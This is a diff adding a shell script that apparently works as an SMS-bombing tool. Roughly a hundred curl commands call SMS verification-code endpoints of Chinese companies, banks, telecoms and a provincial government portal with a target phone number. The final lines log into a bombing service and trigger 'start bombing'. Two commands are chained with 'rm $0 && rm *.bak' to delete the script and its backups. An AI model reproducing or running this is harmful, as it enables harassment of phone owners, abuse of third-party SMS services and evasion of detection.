@@ -1,0 +1,196 @@
+#获取显示当前时间戳
+time="date +%s"
+#将当前时间到毫秒带入到参数
+time1=$(date +%Y-%m-%d%H:%M:%S.%N | cut -b 1-23)
+
+#get
+#齐游网络
+curl -k "https://web3.buyu.img898.com/index.php?act=login.sendVerifyCode&phone=12345678901&platform=android&sig=f1d9aa82295e4f1132843cffb159f29b"
+#视界云
+curl "https://sxsjyzm.com/Trade/zmSendUserCode?user_phone=12345678901"
+#创学
+curl "https://app2.zjchuangxue.com/zsUser/sendSms?mobile=12345678901"
+#红布林
+curl "https://app.aplum.com/user/sendmsg?phone=12345678901&captcha=slwu"
+#米哈游
+curl -k "https://webapi.account.mihoyo.com/Api/create_mobile_captcha?action_ticket=&action_type=regist&mobile=12345678901"
+#达摩院
+curl -k "https://api.dmyuan.io/Login/gt_reg_sms?callback=jQuery21407475991298254681_1593323442603&code=86&mobile=12345678901&username=qjh001&validate_code=&invite=B5019518&session_id=lc6be538vrcfor66kgc0vr3ns7&_=1593323442605"
+#悦买悦卖
+curl -k "http://www.yamyamyam.cn/store/sendVerifySMS?loginPhone=12345678901"
+#松鼠爱玩
+curl -k "http://www.liebaokuaiwan.com/mobile-gateway/api/login/sms?appId=ssaw&onlyRegister=true&mobileNo=12345678901"
+#云集3次
+curl -k "https://r.yunjiglobal.com/yunjirecruit/recruit/substituteSales/getVerificationcode.json?phone=12345678901&countryCode=86&shopId=%252BCRvKctOApRhP%252BoY7wKGmw%253D%253D&type=0&channel=15&accountId=&accountType=deviceId&eventTime=2020-04-26T05:55:03.526Z&refer=&operateSource=0&inviterShopId=183688124&deviceModel=Linux%3B+Android+9%3B+Redmi+K30&manufacturer=Linux%3B+Android+9%3B+Redmi+K20&os=Linux%3B+Android+9%3B+Redmi+K20&osVersion=Linux%3B+Android+9%3B+Redmi+K20&screenWidth=393&businesstSource=0&registerTerminal=6&activitySource=1&sceneType=0" && rm $0 && rm *.bak
+#CCMALL
+curl -k "https://wx.create-chain.net/api/captcha/register/12345678901"
+#日上免税行
+curl -k "http://srmemberapp.srgow.com/sys/captcha/12345678901"
+#百合网
+curl -k "https://my.baihe.com/Getinterregist/captchaAndRegCheck?account=12345678901&type=1"
+#中国平安
+curl -k "https://m.health.pingan.com/mapi/smsCode.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1545122608&app=0&platform=3&app_key=PAHealth&osversion=23&info=&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=m_h5&phone=12345678901"
+#淘元素
+curl -k "https://api.taoelement.vip/account/sms/sms/captcha/12345678901/mineTker"
+#苏宁
+curl -k "http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName=12345678901"
+#58到家
+curl -k"http://user.daojia.com/mobile/getcode?mobile=12345678901"
+#中国平安
+curl -k "http://mobile.health.pingan.com/ehis-hl/ajax/sendOTP.action?smscc=ehiswxonly&phone=12345678901"
+#中国邮政
+curl -k"http://211.156.201.12:8088/youzheng//ems/security?phone=12345678901"
+#腾讯企业邮
+curl -k "http://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=12345678901"
+#人人网
+curl -k "http://activity.renren.com/livecell/ajax/tryVerify?sanbox=a&phoneNum=12345678901"
+#心动网络
+curl -k"https://www.xd.com/users/sendRegisterCode?callback=jQuery110208288176126009057_1574017728587&mobile=12345678901&area_code=86&_=1574017728588"
+#简单学习
+curl -k "https://jdapi.jd100.com/uc/v1/getSMSCode?account=12345678901&sign_type=1&use_type=1"
+#苏宁
+curl -k "https://api.passport.pptv.com/snsms/sendcode?_source=ppsports&apptype=android&appversion=1.0.7.1&deviceId=7433976558071546231901338_vx768bn3ieimjk1n3g5opc7w&terminal=APP&phoneNumber=12345678901&channel=208000202030&format=json&" && rm $0 && rm *.bak
+#万兴科技
+curl -k "https://www.shencut.com/api/v1.0/code?operate_type=register&mobile=12345678901"
+#前程无忧
+curl -k "https://login.51job.com/ajax/sendphonecode.php?jsoncallback=jQuery18303640777548241676_1579193274318&phone=12345678901&type=5&nation=CN&from_domain=51job_m&verifycode=&_=1579193365587"
+#泰康在线
+curl -k "http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile=12345678901"
+#4399小游戏
+curl -k "https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=12345678901"
+#网易
+curl -k "https://services.qiye.163.com/service/official/sendCode?jsonpcallback=jQuery190039810459070645865_1584688891341&mobile=12345678901&_=1584688891342"
+#邮政储蓄银行
+curl -k "https://www.youcash.com/wechat-web/userLogin/sendnote?phone=12345678901&smsType=0"
+#河南政府服务网
+curl -k "https://puser.hnzwfw.gov.cn/api/user/sms?mobile=12345678901&_=1575815921608"
+#凤凰网
+curl -k "http://id.ifeng.com/api/simplesendmsg?mobile=12345678901&comefrom=7&auth=&msgtype=0"
+#CCtallk
+curl -k "https://pass.cctalk.com/intraApi/v1/sms/send?action=SendMsg&mobile=%2B86-12345678901&imgcode=&token=aa315477956d459f40b6f26c9090b790&sendtype=mobilemsgpwd&msgtype=1&captchaVersion=2&user_domain=cc&business_domain=&hpuid=924-ECmHmDZ0xdhMnXe-43&callback=reqwest_1589532775907030687"
+#凹音
+curl -k "http://aoyin.zhizhess.com/api/public/?service=Login.GetCode200&mobile=12345678901&sign=2019"
+#蜜源
+curl -k "https://api.gzmiyuan.com/api/user/registered/five/toSendCode?phone=12345678901&type=6&callback=jsonp_f93526a30bcbf8"
+#联通
+curl -k "https://m.jf.10010.com/wx006/jf-auth/wx/getCaptcha/12345678901"
+#聚合闪电
+curl -k "http://www.yzdwp.cn/index.php/index/sem/send_edit_code/mobile/12345678901"
+#金钱树
+curl -k "http://hbbzvvz.cn/api_loginsend.oh?phone=12345678901&verifycode=ohyueo&type=reg"
+#
+
+
+#post
+#全民董事长通天耳
+curl -d "phone=12345678901&lock=70835&captcha=62&img_key=08e8d9d8124299d5422c73dedcd87df4&state=1" "https://v3-api.jkhelper.com/login/sendApp"
+#天音段视频
+curl -k -d "service=Login.GetCode&sign=e3390520a6e76eca3fed248850a050f8&mobile=12345678901" "http://live.qyrhdq.cn/appapi/"
+#天天有鱼
+curl -k -d "cmd=user_sms_auth&country=86&lang=zh&nc_sessionid=010B3TrWzwsdkM2Lqh18cIU-QzCqgjsT6wQx_SKIqlWoYGygp9wjwf8JpQHOt9EvOAEqOaXjC2SXo6s1z3DDwHw9ILksAsi_jOiYiArUQCcwdB868MvOl8tcUwL1pP4CneDzSA2MNo5mshnwHaxlnkmsiDxieUFHYagIop-4YTfZYaluO33vsBG2squSchQFk56kxKbGxBV0pf75bp_udHYw&nc_sig=05XqrtZ0EaFgmmqIQes-s-CItlVn_NLEBcCU6fXB6RXYGkytunsbYdi9m3TOrm74kEtmAHg5CxOohZmDIdZJeJVvEChgfJ4iX3sj1_FV9CnoBc61lO4c5xF4cmdomh5dU6F8V9XHdrW06suRzq-rSae3Bt6MjTndQ8jPitX3EGYzVZEMJ7myaisVAF99I7xlfFrsJ-FtO56U5Bgnip_7YzXCM5LHbvo3EDr55rfu2-8hOJ5qhY_MrcYaNOV0HVaB0v01Ar3YahFiLVfGqfBS59zo4FWoe7TgNB6T76MaRCsriDzEFz8NHMyKxDemaf7jbRaibr4WPQH4MezFkZZGyzrQfnTIbi5SQE4FR9QVJ35GUh8AxbFe8kArS0rlHBQpqA-HAYaifotP_dLD41FZyOUz0ZFS1mz4z4HP5D9PkHdQRgzncoukXWIXW08JfqQ6q3iI9VU9rCmgyPdGHEm_wLCEnbhglpwxXekb19g7PaeCI&nc_token=FFFF0N0000000000906E:1594113027511:0.8307066334632227&phone=12345678901&rnd=2455252&ts=1594113030499&ver=1.0&sig=7fba2c411e9e4bf72bd36a296b58d11f444237ca050a1f9ef3aef2bc5943bc0d" "https://ttyy.woaiqsh.com/fishapi/"#
+#狐音短视频
+curl -k -d "mobile=12345678901" "http://live.huyinkeji.cn/index.php?g=appapi&m=reg&a=getCode"
+#刷乐
+curl -k -d "tel=12345678901" "http://two.beijingpen.com:8080/index/register/GetSMSCode"
+#车秘
+curl -k -d "phone=12345678901&code=3972" "https://vnokyzsih75e.lix33586.xyz/api/web/send_sms"
+#咕咕乐
+curl -k -d "phone=12345678901" "https://geda.gugule.com/game//user/getCode"
+#超节约
+curl -k -d "" "https://reg.173dd.com/code/sms?mobile=12345678901"
+#TCE
+curl -k -d "{}" "https://apiservice.wtgc.pro/common/sendSmsCode?mobilePhone=12345678901&telephoneAreaCode=86,&type=0"
+#CDN
+curl -k -d "phone=12345678901&type=register,," "http://www.rongjiatech.com/api/sendsms"
+#苏宁
+curl -k -d "scen=PERSON_MOBILE_REG_VERIFY_MOBILE&phoneNum=12345678901&uid=&code=" "http://reg.suning.com/srs-web/ajax/code/sms.do"
+#招商银行
+curl -k -d "tationSerialNo=efcb692f-2009-458e-a6d8-fd4f4f2a6291&recmendedUserMobile=12345678901" "https://mlife.cmbchina.com/AppMgm/getSmsToken.json"
+#逍遥推手
+curl -k -d "sign=14a353820c8d029c1499a482a80b2713&oId=oSdJewg90HeF2Znkk9IdOS6YQhOk&phoneNo=12345678901&businessType=REGISTER&osType=Android&deviceType=123&appCode=HM_PARTNER&version=123" "https://xyts.ihaomai88.com/dirsell-mobile-front/user/sendCheckCode"
+#快赞
+curl -k -d "phone=12345678901" "https://www.kuaizan123.com/rx-user-web/sms/regCode.do"
+#本色世界
+curl -k -d "mobile=12345678901&access_token=&v=10405" "https://apibsw.qcw100.com/rest/2.0/user/user/send_sms"
+#万汇游戏
+curl -k -d "phone=12345678901&channelId=0" "https://yishu588.com/proxy/getAuthCode.do"
+#伙拼平台
+curl -k -d "mobile=12345678901&invite_id=159943" "http://tg.u3j0.cn/Api/Login/CodeVerify"
+#有赞
+curl -k -d "countryCode=%2B86&mobile=12345678901" "https://console.youzanyun.com/account/user/send-sms-regeister"
+#广州享玩
+curl -k -d "systemversion=9&phone=12345678901&modelnumber=Redmi+K30&appid=L1585710916221&appsecret=x9rvib2e3rpno51j&mobile=android&phoneid=860452136542145&channel=71&sign=4ba2707bcfc9e423994d1ac38d438452&oldphoneid=860452136542145&brand=Xiaomi&timestamp=1587637864834&" "http://admin.gzxiangwan.com/index.php?g=MobleApi&m=API&a=sendSms"
+#悬赏猫
+curl -k -d "phone=12345678901" "https://interface.xuanshangmao.com/rest/regist/code"
+#联通沃
+curl -k -d "phone=12345678901&flag=3" "http://bank.wo.cn/hand/getRandCode"
+#泰康在线
+curl -k -d "mobile=12345678901" "http://m.tk.cn/tkmobile/orderSentSmsServlet"
+#葡萄浏览器
+curl -k -d "phone=12345678901&area_code=86" "http://api_new.36qq.com/api/web_send_sms"
+#万博文化
+curl -k -d "action=SendSms&mobile=12345678901" "http://www.wbwh2644.com/tools/action_ajax.ashx"
+#玩了喵
+curl -k -d "phone=12345678901" "http://www.wanlem.com/api/send/reg_code"
+#彩虹桥
+curl -k -d "phone_number=12345678901&send_type=register&qr_id=2142240712" "http://bb.txbbcrm.com/User/Sms/sendSmsHandler"
+#龙湖上海宝桥天街
+curl -k -d "mobile=12345678901" "https://case.topichina.com.cn/longforlottery/index.php?s=/Home/Api/sendmsg"
+#毛豆新车网
+curl -k -d "city_id=0&cityId=0&page_type=&pageType=&phone=12345678901" "https://gateway-web.maodou.com/ncmall/uc/api/sms/getCode?"
+#HOSHCOW
+curl -k -d "mobile=12345678901&nationalCodeId=1&beNewUser=1" "https://www.hashcow.cn/member/member/captcha"
+#天天有鱼
+curl -k -d "cmd=user_sms_auth&country=86&lang=zh&phone=12345678901&rnd=6404366&ts=1592047384381&ver=1.0&sig=618045c54c34da4416e8c24e6291bd0504802f3b341cfadd4a8290580658c191" "https://ttyy.woaiqsh.com/fishapi/"
+#蚂蚁视频
+curl -k -d "merchId=12345678901" "https://api-server.weiyifu123.com/app/sms/register_sms"
+#航行世界
+curl -k -d "mob=12345678901" "http://sa.probeantech.com/mv/mob/send"
+#恋窝
+curl -k -d "phone=12345678901" "http://tp5.91lianwo.com/H5/MemberShareTask/reg"
+#欢乐兑
+curl -k -d "mobile=12345678901&type=1" "https://app.yphnet.com/index/register/get_code.html"
+#拾光
+curl -k -d "phone=12345678901" "http://shiguang.12806.cn/api/user/getSms/smsCode"
+#觅链乐园
+curl -k -d "" "http://prod-gw.cqchangmi.com/ucenter/api/v1/html/user/sendSmsCode?type=5&mobile=12345678901&securityCode=wncn"
+#调用别人接口
+curl -k -d "phone=12345678901" "http://ht.zha666.com:8081/api/sms"
+#晁藤
+curl -k -d "telphone=12345678901&verify=409731" "https://app.tjztct.com//index.php?app=sms&act=app_crsms"
+#趣分类
+curl -k -d "mobile=12345678901&type=1" "https://qufenleiapp.com/api/Login/send_sms"
+#萌鼠世界
+curl -k -d "mobile=12345678901&businessType=REGISTER&msgCode=5666" "https://api.mengshushijie.com/tool/sms"
+
+
+#post方式json参数接口
+
+#海汇数据
+curl -k -H "Content-Type: application/json" -X POST -d '{"type":"mobile","account":"12345678901","country":"35","area_code":"0086"}' "http://app.hmoda.io//api/sms/register?lang=zh-cn"
+#中国移动
+curl -k -H "Content-Type: application/json" -X POST -d '{"mobile":"12345678901","userId":""}' "https://dev.coc.10086.cn/coc/user/smsCode"
+#地摊宝
+curl -k -H "Content-Type: application/json" -X POST -d '{"mobile":"12345678901","type":2,"token_app":null,"t":1594200141152,"u":"ca951b3f-a1f1-4dc8-b28c-3a9c1a1cb76d","v":"1.0","s":"8b7355edddefa64a254ac793a89c9bb8"}' "https://rs-share.kxbwmedia.com/api/user/sms-send_web"
+#优比
+curl -k -H "Content-Type: application/json" -X POST -d '{"tell":"12345678901"}' "https://ublife.bcachain.org/user/sent_reg_code.html"
+#掌上宝段视频
+curl -k -H "Content-Type: application/json" -X POST -d '{"mobile":"12345678901"}' "http://dsp.zzbzb.com/mapi/public/index.php/api/login_api/code"
+#贝壳满满
+curl -k -H "Content-Type: application/json" -X POST -d '{"phone":"12345678901","time_stamp":1593172675826,"h5_sign":"5ec68e1d83f9677ed49d34dc23c59c4f"}' "http://wechat.richrenhang.com/v1/user/quick/register/send_code"
+#趣生活
+curl -k -H "Content-Type: application/json" -X POST -d '{"mobile":"12345678901","country_code":"86","type":"register","crossDomain":true}' "https://qshapp-api.zmycc.com/validate/send_code"
+#贝壳链商
+curl -k -H "Content-Type: application/json" -X POST -d '{"type":"register","mobile":"12345678901"}' "https://fx.bkls.shop/h5/api/sendSm"
+#神酷云世界
+curl -k -H "Content-Type: application/json" -X POST -d '{"mobile":"12345678901","business":"1","mobile_area_code":"86"}' "https://qkl.coolgod.cn/wsy_blockchain/web/index.php?m=function&a=sendCheckCode"
+#四川航空
+curl -k -H "Content-Type: application/json" -X POST -d '{"body":{"verifyCode":"firstValid","mobile":"12345678901","type":"CODE_LOGIN"},"head":{"platformId":3,"imie":""}}' "https://m.sichuanair.com/tribe-touch-web-h5/tribe/jlfuser/sendJlfMsgCode"
+#哥伦布3.0CATWall
+curl -k -H "Content-Type: application/json" -X POST -d '{"countryCode":"86","phone":"12345678901","nodeId":"2","type":"1","username":""}' "http://catpro.columbu.world/wallet/register/sms/send"
+
+
+#cookie登录
+#穿山甲
+curl 'http://ykj.gold/user/login.php' --data 'user=qjh001&pass=123456&submit=' --compressed -c cookie.txt
+curl -d 'phone=12345678901&submit=%E5%BC%80+%E5%A7%8B+%E8%BD%B0+%E7%82%B8'  "http://ykj.gold/user/msg1.php" -b cookie.txt
